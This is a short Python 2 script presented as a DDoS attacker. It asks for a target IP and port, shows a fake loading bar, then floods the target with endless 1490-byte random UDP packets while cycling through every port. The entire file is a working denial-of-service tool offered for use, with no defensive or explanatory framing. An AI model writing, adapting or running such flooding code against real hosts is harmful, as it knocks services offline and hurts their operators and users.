#!/usr/bin/python
# Ddos Attacker
# Coded by Senja
# Github: github.com/thesixtynine/Ddosattack

import os, sys, time, random, socket, string

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def write(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)
logo = """\033[1;77m
    _________________             ______
    ___    |_  /__  /______ _________  /______________
    __  /| |  __/  __/  __ `/  ___/_  //_/  _ \_  ___/
    _  ___ / /_ / /_ / /_/ // /__ _  ,<  /  __/  /
    /_/  |_\__/ \__/ \__,_/ \___/ /_/|_| \___//_/
"""

print logo

print
print("\033[0m[\033[94;1m#\033[0m] Denial of Service ")
print("\033[0m[\033[93;1m*\033[0m] Coded by Senja ")
print("\033[0m[\033[96;1m&\033[0m] My Github: @thesixtynine ")
time.sleep(1)
print

ip = raw_input("\033[0m[\033[95;1m+\033[0m] \033[77;1mIP Target: \033[0m")
port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mPort: \033[0m")
print
write("\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mStarting ...")
time.sleep(1)
print
print("[ IIIIIIIIIIII Loads       15%                          ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIII Loads       25%                    ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIIIIIIIII Loads       50%              ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       75%        ]")
time.sleep(5)
print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       100% ]")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[0mSend \033[1;2;96m%s \033[0mPacket to %s Target \033[1;2;91m%s"%(sent, ip, port)
     if port == 65534:
       port = 1
